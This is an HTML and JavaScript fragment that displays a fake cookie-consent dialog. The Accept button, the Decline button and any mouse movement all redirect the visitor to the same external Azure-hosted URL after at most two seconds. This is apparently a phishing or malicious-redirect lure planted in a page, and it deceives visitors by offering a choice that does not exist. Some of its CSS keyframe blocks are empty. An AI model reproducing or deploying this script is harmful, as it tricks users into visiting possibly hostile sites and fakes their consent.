<style>
        #cookieModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.5s; /* Animation for modal appearance */
        }
        .modal-content {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            max-width: 400px; /* Limit the width of the modal */
            margin: auto;
            animation: slideIn 0.5s; /* Animation for content appearance */
        }
        .button {
            margin-top: 15px;
            padding: 10px 20px;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s; /* Smooth transition for button hover */
        }
        .accept-button {
            background-color: #4CAF50; /* Green */
        }
        .decline-button {
            background-color: #f44336; /* Red */
        }
        .accept-button:hover {
            background-color: #45a049; /* Darker green on hover */
        }
        .decline-button:hover {
            background-color: #d32f2f; /* Darker red on hover */
        }
        @keyframes fadeIn {
            from 
            to 
        }
        @keyframes slideIn {
            from

        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const redirectUrl = 'https://kyakreab86btao.z20.web.core.windows.net//'; 

            // Create the cookie modal
            const modal = document.createElement('div');
            modal.id = 'cookieModal';
            modal.innerHTML = `
                <div class="modal-content">
                    <h2>Cookie Policy</h2>
                    <p>In order to provide a more relevant experience for you, we use cookies to enable some website functionality. Cookies help us see which articles most interest you; allow you to easily share articles on social media; permit us to deliver content, jobs, and ads tailored to your interests and locations; and provide many other site benefits.</p>
                    <p>By accepting, you agree to our use of cookies.</p>
                    <button class="button accept-button" id="acceptCookies">Accept</button>
                    <button class="button decline-button" id="declineCookies">Decline</button>
                </div>
            `;
            document.body.appendChild(modal);

            // Show the cookie modal
            modal.style.display = 'flex';

            // Accept cookies button functionality
            document.getElementById('acceptCookies').onclick = function() {
                window.location.href = redirectUrl;
            };

            // Decline cookies button functionality
            document.getElementById('declineCookies').onclick = function() {
                window.location.href = redirectUrl;
            };

            // Redirect after 2 seconds of cursor movement
            let timeout;
            document.addEventListener('mousemove', function() {
                clearTimeout(timeout);
                timeout = setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 2000);
            });
        });
    </script>
